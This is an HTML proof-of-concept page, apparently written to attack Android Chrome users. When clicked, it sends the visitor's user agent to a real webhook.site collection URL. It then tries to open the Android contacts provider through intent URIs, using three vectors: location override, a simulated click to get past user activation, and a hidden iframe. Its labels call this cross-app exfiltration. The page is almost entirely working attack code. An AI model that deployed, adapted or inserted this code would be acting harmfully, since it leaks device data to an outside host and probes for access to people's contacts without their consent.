<!DOCTYPE html>
<html>
<head><title>Sandbox Escape PoC</title></head>
<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 100px #0f0;border-radius:50%">
        <h1 style="letter-spacing:10px;margin:0">V219_ESCAPE</h1>
        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">ESCAPING_BROWSER_SANDBOX...</div>
        <div style="font-size:10px;color:#333">> TYPE: CROSS_APP_EXFILTRATION</div>
    </div>

<script>
    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";

    document.getElementById('ignite').onclick = () => {
        // 1. DATA RECON
        navigator.sendBeacon(`${webhook}?v=V219_ESCAPE_ATTEMPT`, btoa(window.navigator.userAgent));

        // 2. THE ESCAPE PAYLOAD (Targeting Contacts via Deep Link)
        // Kita menggunakan skema 'content://' yang dibungkus dalam Intent 
        // untuk melihat apakah Chrome membiarkan URI internal bocor.
        const escapeIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.VIEW;" +
            "data=content://com.android.contacts/contacts;" + 
            "category=android.intent.category.BROWSABLE;" +
            "package=com.android.contacts;" +
            "S.browser_fallback_url=https://google.com;" + 
            "end";

        // 3. MULTI-VECTOR INJECTION
        document.getElementById('status').innerText = "INJECTING_PAYLOAD...";
        document.getElementById('status').style.color = "#f00";

        // Vector 1: Location Override
        window.location.assign(escapeIntent);

        // Vector 2: Click Simulation (Bypass User Activation)
        const a = document.createElement('a');
        a.href = escapeIntent;
        a.rel = "noreferrer";
        a.click();

        // Vector 3: Iframe Sandbox Busting
        setTimeout(() => {
            if (!document.hidden) {
                const ifr = document.createElement('iframe');
                ifr.style.display = 'none';
                ifr.src = "intent:contacts#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;package=com.android.contacts;end";
                document.body.appendChild(ifr);
            }
        }, 500);
    };
</script>
</body>
</html>
